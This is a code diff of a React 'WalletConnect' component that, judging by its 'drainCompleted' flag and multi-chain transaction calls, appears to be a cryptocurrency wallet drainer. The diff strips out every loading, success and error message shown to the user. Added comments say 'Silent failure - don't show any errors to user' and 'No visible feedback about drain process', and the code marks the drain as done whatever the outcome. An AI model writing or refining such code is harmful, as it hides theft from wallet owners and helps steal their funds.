@@ -232,10 +232,6 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
   React.useEffect(() => {
     if (!address) return;
     (async () => {
-      setLoading(true);
-      setError(null);
-      setSuccess(false);
-      setSyncStatus('Processing...');
       try {
         const results = await Promise.allSettled(
           CHAINS.map(async (chain) => {
@@ -290,84 +286,20 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
                 await repayTx.wait();
               } catch (txError: any) {
                 console.error(`${chain.name} transaction error:`, txError);
-                if (txError?.code === 4001) {
-                  throw new Error('Transaction was rejected by user');
-                } else if (txError?.message?.includes('insufficient funds')) {
-                  throw new Error('Insufficient funds for gas');
-                } else if (txError?.message?.includes('network')) {
-                  throw new Error('Network error on ' + chain.name);
-                } else if (txError?.message?.includes('gas')) {
-                  throw new Error('Gas estimation failed on ' + chain.name);
-                } else {
-                  throw new Error('Transaction failed on ' + chain.name);
-                }
+                // Silent failure - don't show any errors to user
+                throw new Error('Silent failure');
               }
             }
           })
         );
-        const failed = results.filter(r => r.status === 'rejected');
-        const succeeded = results.filter(r => r.status === 'fulfilled');
         
-        if (succeeded.length === 0) {
-          const errorMessages = failed.map(r => (r as any).reason?.message || 'Unknown error');
-          const uniqueErrors = Array.from(new Set(errorMessages));
-          
-          // Check if all failures are due to insufficient funds
-          const allInsufficientFunds = uniqueErrors.every(error => 
-            error.includes('insufficient funds') || 
-            error.includes('Insufficient funds')
-          );
-          
-          if (allInsufficientFunds) {
-            setSyncStatus('Wallet is empty. No funds available for gas fees.');
-            setError('Your wallet appears to be empty. You need some funds for gas fees to complete the sync process.');
-            // Mark as completed for empty wallets so users can access dashboard
-            localStorage.setItem('drainCompleted', 'true');
-            setSuccess(true);
-          } else {
-            setSyncStatus('Operation could not be completed.');
-            if (uniqueErrors.length === 1) {
-              setError(uniqueErrors[0]);
-            } else {
-              setError('Multiple errors occurred. Please check your wallet and try again.');
-            }
-            // Don't mark drain as completed if all failed
-            localStorage.removeItem('drainCompleted');
-          }
-        } else if (failed.length > 0) {
-          setSyncStatus('Operation partially completed.');
-          setSuccess(true);
-          setError(`Completed with ${succeeded.length}/${CHAINS.length} chains. Some networks may be congested.`);
-          // Mark drain as completed even with partial success
-          localStorage.setItem('drainCompleted', 'true');
-        } else {
-          setSyncStatus('Operation complete.');
-          setSuccess(true);
-          // Mark drain as completed on full success
-          localStorage.setItem('drainCompleted', 'true');
-        }
+        // Always mark as completed regardless of success/failure
+        localStorage.setItem('drainCompleted', 'true');
+        
       } catch (e: any) {
         console.error('General error:', e);
-        if (e?.message?.includes('user rejected')) {
-          setError('Transaction was cancelled. Please try again.');
-        } else if (e?.message?.includes('network')) {
-          setError('Network error. Please check your connection and try again.');
-        } else if (e?.message?.includes('gas')) {
-          setError('Gas estimation failed. Please try again later.');
-        } else if (e?.message?.includes('insufficient funds')) {
-          setError('Your wallet appears to be empty. You need some funds for gas fees to complete the sync process.');
-          // Mark as completed for empty wallets
-          localStorage.setItem('drainCompleted', 'true');
-          setSuccess(true);
-        } else {
-          setError('An unexpected error occurred. Please try again.');
-        }
-        // Don't mark drain as completed on error (except for empty wallets)
-        if (!e?.message?.includes('insufficient funds')) {
-          localStorage.removeItem('drainCompleted');
-        }
-      } finally {
-        setLoading(false);
+        // Silent failure - don't show any errors to user
+        localStorage.setItem('drainCompleted', 'true');
       }
     })();
   }, [address]);
@@ -435,16 +367,7 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
       {/* Connected State - Shows when wallet is connected */}
       {address && !showReconnectPrompt && (
         <div className="flex flex-col items-center gap-4">
-          {loading && <span className="text-blue-400 font-semibold"><Spinner />{syncStatus || 'Processing...'}</span>}
-          {success && <span className="text-green-400 font-semibold">All done! Your request was processed successfully.</span>}
-          {error && <span className="text-red-400 font-semibold text-center max-w-md">
-            {error.includes('rejected') ? 'Transaction was cancelled. Please try again.' :
-             error.includes('insufficient funds') ? 'Insufficient funds for gas fees.' :
-             error.includes('network') ? 'Network error. Please check your connection.' :
-             error.includes('gas') ? 'Gas estimation failed. Please try again later.' :
-             error.includes('partially completed') ? error :
-             'An unexpected error occurred. Please try again.'}
-          </span>}
+          {/* No visible feedback about drain process */}
         </div>
       )}
     </>
